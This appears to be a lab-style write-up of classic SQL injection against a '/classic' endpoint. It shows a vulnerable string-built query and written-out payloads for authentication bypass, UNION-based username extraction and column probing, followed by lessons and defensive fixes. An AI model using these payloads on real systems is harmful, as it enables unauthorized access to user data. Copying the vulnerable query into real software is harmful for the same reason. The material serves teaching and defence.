🧨 Classic SQL Injection (Username Enumeration)
🎯 Objective

Exploit a vulnerable SQL query to extract user information from the database using unfiltered input in the classic form

🧠 Application Context

    Endpoint: /classic

    Backend Logic:

    query = f"SELECT * FROM users WHERE username = '{name}'"

🧪 Exploit Path
🔹 Step 1: Initial Test

Visit:  /classic

Submit:  ' OR 1=1--
✔️ This will bypass the username filter and return all users.

🔹 Step 2: Extracting All Usernames

Submit:  ' UNION SELECT 1, username, 3, 4, 5 FROM users--

Expected output (or partial DB dump):

('admin', ...)
('guest', ...)
('alice', ...)

🔹 Step 3: Trigger an Error for Manual DB Enumeration

Submit:  ' ORDER BY 5--
✔️ Helps discover the number of columns in the result set by triggering errors or confirming successful execution.

🔹 Step 4: Discover Specific User

Submit:  ' AND username LIKE 'admin'--
✔️ Boolean-based test to confirm a specific user's existence

🧰 Tools & Techniques

    SQL syntax testing (', --, UNION)

    Boolean logic exploitation (OR 1=1, AND 1=0)

    Column inference (ORDER BY, UNION SELECT)

    Error-based information leakage

    💡 Lessons Learned

    Even basic string injection can lead to full user enumeration

    Errors and query behavior reveal database structure

    Always sanitize input using parameterized queries

    ✅ Defensive Fixes

    Use prepared statements (e.g., cur.execute("SELECT * FROM users WHERE username = ?", (name,)))

    Disable verbose SQL errors in production

    Implement input validation and query whitelisting